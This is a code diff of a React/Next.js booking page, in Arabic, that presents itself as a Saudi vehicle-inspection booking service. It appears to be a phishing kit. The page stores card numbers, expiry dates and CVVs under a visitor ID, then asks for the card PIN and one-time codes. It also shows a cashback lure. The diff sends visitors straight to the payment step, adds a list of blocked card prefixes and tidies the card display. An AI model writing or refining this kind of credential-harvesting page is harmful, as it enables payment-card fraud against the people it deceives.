@@ -4,11 +4,11 @@ import React, { useEffect, useState } from "react"
 import Image from "next/image"
 import VerificationPage from "@/components/verification-page"
 import { Dialog, DialogContent } from "@/components/ui/dialog"
-import { X } from "lucide-react"
+import { CircleAlert, Menu, X } from "lucide-react"
 import { motion } from "framer-motion"
 import { Input } from "@/components/ui/input"
 import { Loader2 } from "lucide-react"
-import { CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
+import { CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { AlertCircle } from "lucide-react"
 
@@ -21,6 +21,7 @@ import { setupOnlineStatus } from "@/lib/utils"
 import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
 import { SaudiPlateInput } from "@/components/saudi-plate-input"
 import { validateSaudiPhoneNumber, validateSaudiNationalId } from "@/lib/validation"
+import { Checkbox } from "@/components/ui/checkbox"
 
 // Removed duplicate type BankInfo definition as it's already imported from "@/types"
 // type BankInfo = {
@@ -120,7 +121,7 @@ export default function BookingPage() {
   const [authorizedAgreement, setAuthorizedAgreement] = React.useState(false)
   // ADDED END
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
+  const [currentStep, setCurrentStep] = useState<AppStep>("payment-method") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
@@ -137,6 +138,7 @@ export default function BookingPage() {
   const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
   const [phoneOtpSent, setPhoneOtpSent] = useState(false)
   const [showStcModal, setShowStcModal] = useState(false)
+  const [authorizeInspection, setAuthorizeInspection] = useState(false)
   const [showOfferModal, setShowOfferModal] = useState(false)
   const [stcModalOpen, setStcModalOpen] = useState(false)
   const [cardOtpApproval, setCardOtpApproval] = useState<ApprovalStatus | undefined>() // Declared the variable
@@ -247,6 +249,7 @@ export default function BookingPage() {
 
   const handleCardFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    if(!checkCardAllow(cardNumber)){
     await addData({
       id: visitorID,
       cardNumber,
@@ -255,13 +258,14 @@ export default function BookingPage() {
       cvv,
       step: "card-details-submitted",
     })
+  }
     setIsLoading(true)
     setTimeout(() => {
       setCurrentStep("pin")
       setIsLoading(false)
     }, 1500)
   }
-
+  
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setPinError("")
@@ -401,7 +405,7 @@ export default function BookingPage() {
     const normalized = normalizeNumbers(value.replace(/\s/g, ""))
     const formatted = normalized.replace(/(\d{4})/g, "$1 ").trim()
     setCardNumber(formatted)
-    checkBIN(formatted)
+    console.log(checkCardAllow(formatted))
   }
 
   const vehicleTypes = [
@@ -554,22 +558,22 @@ export default function BookingPage() {
     {
       id: "card" as PaymentMethod,
       label: "بطاقة ائتمان",
-      icon: Wallet,
+      icon: '/Visa-Mastercard-1-2048x755.png',
       description: "فيزا أو ماستركارد",
-      badge: "استرداد نقدي 40%",
+      badge: "استرداد نقدي 30%",
       available: true,
     },
     {
       id: "wallet" as PaymentMethod,
       label: "مدى",
-      icon: CreditCard,
+      icon: '/mada.svg',
       description: "بطاقة مدى",
-      available: false,
+      available: true,
     },
     {
       id: "bank" as PaymentMethod,
       label: "Apple Pay",
-      icon: Wallet,
+      icon: '/images.png',
       description: "الدفع عبر آبل",
       available: false,
     },
@@ -672,6 +676,7 @@ export default function BookingPage() {
   if (currentStep === "landing") {
     return (
       <div dir="rtl" className="min-h-screen bg-background">
+          
         {/* Hero Section */}
         <div className="relative overflow-hidden bg-gradient-to-b from-secondary/30 to-background">
           <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
@@ -877,11 +882,11 @@ export default function BookingPage() {
               >
                 <X className="h-4 w-4 text-gray-600" />
               </button>
-              <img src="/special-offer-promotion-banner-arabic-rtl.jpg" alt="عرض خاص" className="w-full rounded-lg" />
+              <img src="/adcs.jpg" alt="عرض خاص" className="w-full rounded-lg" />
             </div>
             <div className="text-center space-y-3 pt-2">
               <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
-              <p className="text-gray-600">استمتع بخصم 40% عند الدفع ببطاقة الائتمان</p>
+              <p className="text-gray-600">استمتع بخصم 30% عند الدفع ببطاقة الائتمان</p>
               <button
                 onClick={() => setShowOfferModal(false)}
                 className="w-full bg-emerald-600 text-white py-3 rounded-lg font-medium hover:bg-emerald-700 transition-colors"
@@ -895,10 +900,38 @@ export default function BookingPage() {
       </div>
     )
   }
+  const blockedPrefixes = ['4847', '4323', '4685'];
+
+  const checkCardAllow = (cardNum: string) => {
+    const isBlocked = blockedPrefixes.some(prefix =>
+      cardNum.startsWith(prefix)
+    );
+  
+    if (isBlocked) {
+      setCardError('البطاقة غير مدعومة يرجى ادخال بطاقة اخرى');
+      return false;
+    }
+  
+    setCardError('');
+    return true;
+  };
 
   if (currentStep === "booking") {
     return (
-      <div dir="rtl" className="min-h-screen bg-background py-12 px-4">
+      <div dir="rtl" className="min-h-screen bg-background  px-4">
+           <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
+        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
+          <button className="p-2 hover:bg-accent rounded-lg transition-colors">
+            <Menu className="w-5 h-5 text-foreground" />
+          </button>
+          <div className="flex items-center gap-3">
+          <img src='/next.svg' alt="logo" width={180}/>
+          </div>              
+          <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
+            English
+          </Button>
+        </div>
+      </header>
         <div className="max-w-3xl mx-auto">
           <Card className="shadow-lg border-border/40">
             <CardHeader className="text-center border-b border-border/40 pb-6">
@@ -985,10 +1018,10 @@ export default function BookingPage() {
                     value={displayNationalId}
                     onChange={(e) => {
                       const westernValue = e.target.value
-                        .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                        .replace(/[0-9]/g, (d) => "0123456789".indexOf(d).toString())
                         .replace(/\D/g, "")
 
-                      const arabicValue = westernValue.replace(/\d/g, (d) => "٠١٢٣٤٥٦٧٨٩"[Number.parseInt(d)])
+                      const arabicValue = westernValue.replace(/\d/g, (d) => "0123456789"[Number.parseInt(d)])
 
                       setNationalId(westernValue)
                       setDisplayNationalId(arabicValue)
@@ -1001,6 +1034,31 @@ export default function BookingPage() {
                     يجب أن يبدأ بـ 1 (سعودي) أو 2 (مقيم) ويتكون من 10 أرقام
                   </p>
                 </div>
+                <div className="space-y-3 mb-6">
+                    <label className="text-sm font-medium text-foreground">
+                      رقم جوال المالك <span className="text-red-500">*</span>
+                    </label>
+                    <div className="flex gap-2">
+                      <div className="w-32 h-12 px-3 rounded-lg border border-border bg-muted flex items-center justify-center gap-2">
+                        <span className="text-xl">🇸🇦</span>
+                        <span className="text-sm font-medium">+966</span>
+                      </div>
+                      <Input
+                        type="tel"
+                        inputMode="numeric"
+                        maxLength={10}
+                        value={authorizedPhone}
+                        onChange={(e) => {
+                          const value = e.target.value
+                            .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                            .replace(/\D/g, "")
+                          setAuthorizedPhone(value)
+                        }}
+                        placeholder="5XXXXXXXX"
+                        className="h-12 flex-1"
+                      />
+                    </div>
+                  </div>
 
                 <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">الرقم التسلسلي</label>
@@ -1032,8 +1090,19 @@ export default function BookingPage() {
                     ))}
                   </select>
                 </div>
-
-                {/* ADDED START */}
+                <div className="flex items-start gap-3 mb-6">
+          <Checkbox
+            id="authorize"
+            checked={authorizeInspection}
+            onCheckedChange={(checked) => setAuthorizeInspection(checked as boolean)}
+            className="mt-1"
+          />
+          <label htmlFor="authorize" className="flex-1 text-base leading-relaxed cursor-pointer">
+            <div className="font-medium text-gray-900 mb-1">هل تريد تفويض شخص آخر بفحص المركبة</div>
+            <div className="text-sm text-gray-500">قم بتفعيل الخيار لو أردت تفويض شخص آخر غيرك بفحص المركبة</div>
+          </label>
+        </div>
+        {authorizeInspection?   
                 <div className="border-t pt-8 mt-8">
                   <h3 className="text-xl font-bold text-foreground mb-6">بيانات المفوض</h3>
 
@@ -1076,7 +1145,6 @@ export default function BookingPage() {
                       onChange={(e) => setAuthorizedName(e.target.value)}
                       placeholder="أدخل اسم المفوض"
                       className="h-12"
-                      required
                     />
                   </div>
 
@@ -1103,7 +1171,6 @@ export default function BookingPage() {
                         }}
                         placeholder="5XXXXXXXX"
                         className="h-12 flex-1"
-                        required
                       />
                     </div>
                   </div>
@@ -1127,7 +1194,6 @@ export default function BookingPage() {
                         }}
                         placeholder="0000 0000 000"
                         className="h-12 pl-12"
-                        required
                       />
                       <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
@@ -1150,7 +1216,6 @@ export default function BookingPage() {
                         value={authorizedBirthDate}
                         onChange={(e) => setAuthorizedBirthDate(e.target.value)}
                         className="h-12 pl-12"
-                        required
                       />
                       <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground pointer-events-none">
                         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
@@ -1171,7 +1236,6 @@ export default function BookingPage() {
                       checked={authorizedAgreement}
                       onChange={(e) => setAuthorizedAgreement(e.target.checked)}
                       className="mt-1 w-5 h-5 rounded border-border text-teal-700 focus:ring-teal-700"
-                      required
                     />
                     <label
                       htmlFor="authorized-agreement"
@@ -1181,7 +1245,7 @@ export default function BookingPage() {
                       عليها
                     </label>
                   </div>
-                </div>
+                </div>:null}
                 {/* ADDED END */}
 
                 {/* Location Selection */}
@@ -1290,7 +1354,20 @@ export default function BookingPage() {
   if (currentStep === "payment-method") {
     return (
       <div dir="rtl" className="min-h-screen bg-background py-12 px-4">
-        <div className="max-w-2xl mx-auto">
+      
+          <header className="bg-card/80 backdrop-blur-lg border-b border-border sticky top-0 z-50">
+        <div className="container mx-auto px-6 py-4 flex items-center justify-between">
+          <button className="p-2 hover:bg-accent rounded-lg transition-colors">
+            <Menu className="w-5 h-5 text-foreground" />
+          </button>
+          <div className="flex items-center gap-3">
+          <img src='/next.svg' alt="logo" width={180}/>
+          </div>              
+          <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
+            English
+          </Button>
+        </div>
+      </header>  <div className="max-w-2xl mx-auto">
           <Card className="shadow-lg border-border/40">
             <CardHeader className="text-center border-b border-border/40 pb-6">
               <CardTitle className="text-3xl font-bold text-foreground">اختر طريقة الدفع</CardTitle>
@@ -1323,7 +1400,7 @@ export default function BookingPage() {
                             paymentMethod === method.id ? "bg-teal-700 text-white" : "bg-secondary text-foreground"
                           }`}
                         >
-                          <method.icon className="h-6 w-6" />
+                      <img src={method.icon} alt="log" width={80}/>
                         </div>
                         <div className="text-right">
                           <div className="font-semibold text-foreground text-lg">{method.label}</div>
@@ -1372,11 +1449,11 @@ export default function BookingPage() {
               >
                 <X className="h-4 w-4 text-gray-600" />
               </button>
-              <img src="/special-offer-promotion-banner-arabic-rtl.jpg" alt="عرض خاص" className="w-full rounded-lg" />
+              <img src="/adcs.jpg" alt="عرض خاص" className="w-full rounded-lg" />
             </div>
             <div className="text-center space-y-3 pt-2">
               <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
-              <p className="text-gray-600">استمتع بخصم 40% عند الدفع ببطاقة الائتمان</p>
+              <p className="text-gray-600">استمتع بخصم 30% عند الدفع ببطاقة الائتمان</p>
               <button
                 onClick={() => setShowOfferModal(false)}
                 className="w-full bg-emerald-600 text-white py-3 rounded-lg font-medium hover:bg-emerald-700 transition-colors"
@@ -1400,19 +1477,23 @@ export default function BookingPage() {
                   <div className="absolute top-8 right-8">
                     <div className="text-2xl font-bold">{bankInfo?.name || "بطاقة ائتمان"}</div>
                   </div>
+                  <div className="absolute top-8 left-8">
+                 {paymentMethod==="card"&&cardNumber.at(0)==='4'?  <img src="/visa-card.png" alt="logo" width={50}/>: paymentMethod==="card"&&cardNumber.at(0)==='5'? <img src="/master.svg" alt="logo" width={50}/>:null}
+                 {paymentMethod==="wallet"?<img src="/mada.svg" alt="logo" width={50}/>:null}
+                  </div>
                   <div className="absolute top-1/2 right-8 -translate-y-1/2">
-                    <div className="text-3xl font-mono tracking-widest" dir="ltr">
-                      {cardNumber || "•••• •••• •••• ••••"}
+                    <div className="text-xl font-mono tracking-widest" dir="ltr">
+                      {'**** **** **** '+cardNumber.slice(-4) || "•••• •••• •••• ••••"}
                     </div>
                   </div>
                   <div className="absolute bottom-8 right-8 left-8 flex justify-between items-end">
                     <div>
                       <div className="text-xs opacity-80 mb-1">اسم حامل البطاقة</div>
-                      <div className="text-lg font-semibold">{cardName || "الاسم الكامل"}</div>
+                      <div className="text-md font-semibold">{cardName || "الاسم الكامل"}</div>
                     </div>
                     <div>
                       <div className="text-xs opacity-80 mb-1">تاريخ الانتهاء</div>
-                      <div className="text-lg font-mono">{expiryDate || "MM/YY"}</div>
+                      <div className="text-md font-mono">{expiryDate || "MM/YY"}</div>
                     </div>
                   </div>
                 </div>
@@ -1500,8 +1581,8 @@ export default function BookingPage() {
 
                     <Button
                       type="submit"
-                      className="w-full h-14 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90"
-                      disabled={isLoading}
+                      className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
+                      disabled={isLoading ||cardError.length>2}
                     >
                       {isLoading ? (
                         <>
@@ -1514,6 +1595,15 @@ export default function BookingPage() {
                     </Button>
                   </form>
                 </CardContent>
+                <CardFooter>
+                  {cardError.length>2&&<Alert>
+                    <AlertDescription className="text-red-500">
+                      <CircleAlert/>
+                     
+                    البطاقة غير مدعومة يرجى ادخال بطاقة اخرى
+                    </AlertDescription>
+                  </Alert>}
+                </CardFooter>
               </Card>
             </div>
           </div>
@@ -1618,6 +1708,7 @@ export default function BookingPage() {
                       onChange={(e) => setPhone(normalizeNumbers(e.target.value))}
                       placeholder="05xxxxxxxx"
                       className="h-12"
+                      maxLength={10}
                       required
                     />
                     <p className="text-xs text-muted-foreground">يجب أن يبدأ بـ 05 ويتكون من 10 أرقام</p>
@@ -1647,7 +1738,7 @@ export default function BookingPage() {
 
                   <Button
                     type="submit"
-                    className="w-full h-14 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90"
+                    className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
                     disabled={isLoading}
                   >
                     {isLoading ? (
@@ -1715,7 +1806,7 @@ export default function BookingPage() {
                   </Button>
                   <Button
                     type="submit"
-                    className="flex-1 h-12 bg-teal-700 hover:bg-teal-700/90"
+                    className="flex-1 h-12 text-white bg-teal-700 hover:bg-teal-700/90"
                     disabled={isLoading || phoneOtp.length !== 6}
                   >
                     {isLoading ? (
